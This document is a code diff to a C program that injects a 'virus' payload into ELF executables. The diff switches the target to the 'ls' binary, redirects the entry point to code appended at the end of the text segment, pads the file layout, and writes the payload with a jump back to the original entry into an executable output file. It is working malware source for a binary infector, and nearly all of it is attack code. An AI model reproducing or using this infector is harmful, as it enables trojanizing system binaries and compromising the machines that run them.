@@ -7,19 +7,23 @@
 #include <zconf.h>
 #include <string.h>
 #include <errno.h>
-
+#include "payload.h"
 
 
 int main(){
 
-    char *path_to_elf = "simple_executable";
+    char *path_to_elf = "ls";
     char * host;
-    unsigned char * parasite =  (unsigned  char*)"\x90\x90\xE9\xF2\xFC\xFF\xF1";
+    uint8_t* memory;
+    size_t virus_size;
+    Elf64_Addr jmp_off_t;
+    get_virus_payload("payload", &memory, &virus_size, &jmp_off_t);
+    unsigned char * parasite =  (unsigned  char*)"\xE9\xF2\xFC\xFF\xF1";
     size_t  jump_length = 5;
-    size_t length_without_jump = 2;
+    size_t length_without_jump = virus_size;
     struct stat sb;
     size_t psize = getpagesize();
-    int jmp_len = strlen(parasite);
+    int jmp_len = length_without_jump;
 
 
 
@@ -49,7 +53,8 @@ int main(){
         if(phdr[i].p_type == PT_LOAD){
             ehdr->e_entry = phdr[i].p_vaddr + phdr[i].p_filesz;
             parasite_insertion_address = phdr[i].p_vaddr + phdr[i].p_filesz;
-           end_of_text = phdr[i].p_offset + phdr[i].p_filesz;
+            start_of_text  = phdr[i].p_offset;
+            end_of_text = phdr[i].p_offset + phdr[i].p_filesz;
             phdr[i].p_filesz += jmp_len;
             phdr[i].p_memsz += jmp_len;
             for(int j = i+1; j < ehdr->e_phnum; j++){
@@ -68,7 +73,7 @@ int main(){
             shdr[i].sh_offset += psize;
         }
     }
-    int out_fd = open("out_file",O_CREAT | O_WRONLY | O_TRUNC);
+    int out_fd = open("out_file",O_CREAT | O_WRONLY | O_TRUNC, 0777);
     if(out_fd < 0){
         printf("%d", errno);
         return -1;
@@ -77,16 +82,22 @@ int main(){
         printf("%d", errno);
         return -1;
     }
-    Elf64_Addr jmp = older_entry - (ehdr->e_entry + jump_length + length_without_jump);
+    Elf64_Addr jmp = older_entry - (ehdr->e_entry + jmp_off_t);
     static unsigned char address[4];
     *(int*)&address[0] = jmp;
 
 
-    if(write(out_fd, parasite, length_without_jump + 1) < 0){
+    if(write(out_fd, memory, jmp_off_t - 5) < 0){
         return -1;
     }
 
+    if(write(out_fd, parasite, 1) < 0){
+        return -1;
+    }
     if(write(out_fd, address, 4) < 0){
+        return -1;
+    }
+    if(write(out_fd, memory + jmp_off_t, virus_size - jmp_off_t) < 0){
         return -1;
     }
 
